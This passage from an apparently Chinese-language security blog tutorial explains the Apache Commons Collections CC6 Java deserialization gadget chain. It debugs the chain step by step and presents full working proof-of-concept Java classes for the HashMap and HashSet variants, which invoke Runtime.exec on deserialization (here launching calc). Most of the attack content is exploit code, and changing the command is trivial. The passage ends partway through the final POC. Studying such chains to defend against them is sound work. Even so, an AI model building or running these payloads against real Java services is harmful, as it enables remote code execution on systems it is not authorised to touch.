class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure><p>其实和我们CC1里面写的是一样的</p><p>注意这里我使用了<code>fakeTransformers</code> 这是为了<strong>避免本地调试时触发命令执行</strong>  最后写POC的时候记得改成<code>真正的Transformers</code>就行</p><p>现在，我们拿到了⼀个恶意的LazyMap对象 <code>outerMap</code> </p><p>将其作为 TiedMapEntry 的map属性：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后 为了调用 TiedMapEntry.hashCode() ，我们需要将 tme 对象作为 HashMap 的⼀个key。注意， <strong>这里我们需要新建⼀个HashMap</strong>，而不是用之前LazyMap利用链里的那个HashMap，两者没任何关 系</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure><p>最后，我就可以将这个 expMap 作为对象来序列化了，不过，别忘了将真正的 transformers 数组设置 进来</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ==================</span></span><br><span class="line"><span class="comment">// 将真正的transformers数组设置进来</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br><span class="line"><span class="comment">// ==================</span></span><br><span class="line"><span class="comment">// ⽣成序列化字符串</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">oos.writeObject(expMap);</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">System.out.println(barr);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br></pre></td></tr></table></figure><p>合起来跑一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc66</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// 将真正的transformers数组设置进来</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样 出现了问题 代码运行没有问题 但是不能弹出计算器</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1d9cca0.png" alt="image-20240530001250383"></p><p>所以问题是什么呢</p><p>首先 我们前面部分应该是没有问题的 </p><p>最后序列化 反序列化的地方应该也是没有问题的 (我下了断点看了的)</p><p>那我们就<strong>重点看看后面写的代码</strong> </p><p>我是先这里下断点 一步一步debug看的</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1d7e6cf.png" alt="image-20240530002522759"></p><p>过程就不说了 </p><p>最后锁定在这里：</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1d66a79.png" alt="image-20240530003848973"></p><p>好 debug看下</p><p>第一步会调用TiedMapEntry中的hashCode()</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1de3255.png" alt="image-20240530004832620"></p><p>这里没什么问题 </p><p>然后会进入getValue()</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1e01158.png" alt="image-20240530005008664"></p><p>然后到LazyMap.get()方法</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1e9c532.png" alt="image-20240530005042280"></p><p>注意此时Key已经有了一个值keykey</p><p>?</p><p>我们什么时候向outerMap中传入了一个keykey对象？</p><p>注意 我们前面的<code>keykey</code>实际上是一个键</p><p>是一个随意选择的键，用于与 <code>outerMap</code> 关联 与这里的keykey对象是两个完全不同的东西</p><blockquote><p>在代码中，<code>&quot;keykey&quot;</code> 实际上并不直接作为一个预存在于 <code>outerMap</code> 中的对象。它是作为 <code>TiedMapEntry</code> 的一个构造参数，用来指定一个键名。当通过 <code>TiedMapEntry</code> 访问其值时，它会尝试从关联的 <code>Map</code>（这里是 <code>outerMap</code>）中<strong>查找</strong>给定的键（即 <code>&quot;keykey&quot;</code>）。</p><p><code>outerMap</code> 是由 <code>LazyMap.decorate(innerMap, transformerChain)</code> 创建的，这意味着它是一个装饰过的映射，其行为已经不是简单的键值对存储——而是当尝试访问一个<strong>不存在的键</strong>时，会执行特定的变换逻辑（在这里，就是恶意构造的变换器链）。</p><p>因此，直到尝试通过 <code>TiedMapEntry</code> 实例访问 <code>&quot;keykey&quot;</code> 的值之前，<code>&quot;keykey&quot;</code> 本身并不是 <code>outerMap</code> 中的一个实际存在的键。这一访问动作触发了 <code>LazyMap</code> 去查找该键，由于键不存在，它转而使用关联的变换器链尝试“计算”该键的值，从而启动了一连串导致命令执行的变换操作。</p></blockquote><p>而这里 下一步直接掠过了我们的重要代码</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1e2e74b.png" alt="image-20240530005652081"></p><p>它并没有执行我们需要的<code>factory.transform(key)</code></p><p>这也是为什么我们没有触发计算器的原因</p><p>那我们回过头来看看什么时候传入了这个keykey对象</p><p>这个关键点就出在 <code>expMap.put(tme, &quot;valuevalue&quot;)</code>; 这个语句⾥⾯。 HashMap的put方法法中，也有调用到 hash(key) ：（其实就是HashMap.put()）</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1d68d8d.png" alt="image-20240530011304516"></p><p>这里就导致 LazyMap 这个利用链在这里被调用了⼀遍，因为我们前面用了 <code>fakeTransformers</code> ，所以此时并没有触发命令执行，但实际上也对我们构造Payload产生了影响</p><p>解决：</p><p>只需要将keykey这个Key从outerMap中移除即可： </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.remove(<span class="string">&quot;keykey&quot;</span>) 。</span><br></pre></td></tr></table></figure><p>接在expMap.put(tme, “valuevalue”)后面即可</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; <span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line">        <span class="comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line">        <span class="comment">// ==================</span></span><br><span class="line">        <span class="comment">// ⽣成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 本地测试触发</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功调用</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1f596c8.png" alt="image-20240530012454778"></p><p>调用流程：</p><blockquote><p>HashMap.readObject()-&gt;<br>    HashMap.hash()-&gt;<br>        TiedMapEntry.hashCode()-&gt;<br>            TiedMapEntry.getValue()-&gt;<br>                LazyMap.get()-&gt;<br>                    ChainedTransformer.transfomer()-&gt;<br>                        …后面就一样了</p><p>​                      -&gt;ConstantTransformer.transform()<br>​                      -&gt;InvokerTransformer.transform()<br>​                        -&gt;Method.invoke()<br>​                          -&gt;Class.getMethod()<br>​                      -&gt;InvokerTransformer.transform()<br>​                         -&gt;Method.invoke()<br>​                           -&gt;Runtime.getRuntime()<br>​                      -&gt;InvokerTransformer.transform()<br>​                           -&gt;Method.invoke()<br>​                              -&gt;Runtime.exec()</p></blockquote><h3 id="HashSet链"><a href="#HashSet链" class="headerlink" title="HashSet链"></a>HashSet链</h3><h4 id="链子构造-1"><a href="#链子构造-1" class="headerlink" title="链子构造"></a>链子构造</h4><p>这就是ysoserial中的</p><p>是利用 <code>java.util.HashSet.readObject</code> –&gt; <code>HashMap.put()</code> –&gt; <code>HashMap.hash(key)</code> –&gt; <code>TiedMapEntry.hashCode()</code> 。</p><p><strong>HashSet.Put()</strong></p><p>java.util.HashSet.readObject调用了put</p><p><img src="https://bu.dusays.com/2024/06/07/66630b1e2f54c.png" alt="image-20240530013424256"></p><p>put:<br><img src="https://bu.dusays.com/2024/06/07/66630b1d611b9.png" alt="image-20240530013455319"></p><p>这个 put(HashMap) 方法中就调用了 hash 方法</p><p><code>HashMap.put()</code> –&gt; <code>HashMap.hash(key)</code></p><p><img src="https://bu.dusays.com/2024/06/07/66630b1de2ea6.png" alt="image-20240530013805729"></p><p>后面就不说了吧 一样的</p><p>好 直接开始构造POC</p><p>新构建了一个 hashset 类，然后将 TiedMapEntry 通过 add 方法塞入了 hashset 内，我以为这样就可以成功执行了，可事实并非这样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"> </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Transformer[] transformers =<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer c=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        Map inmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lzmap=LazyMap.decorate(inmap,c);</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lzmap,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        HashSet hashset= <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashset.add(tme);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(c,transformers);</span><br><span class="line"> </span><br><span class="line">        FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(hashset);</span><br><span class="line">        oos.close();</span><br><span class="line"> </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/06/07/66630b1ed9bad.png" alt="image-20240530014037841"></p><p>同样没弹出</p><p>问题也出在 像 HashMap 一样的问题</p><p>所以我们添加</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lzmap.clear()</span><br></pre></td></tr></table></figure><p>所以</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc66</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"> </span><br><span class="line">        String cmd=<span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        Transformer[] transformers =<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        </span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer c=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        Map inmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lzmap=LazyMap.decorate(inmap,c);</span><br><span class="line">        TiedMapEntry tme=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lzmap,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        HashSet hashset= <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        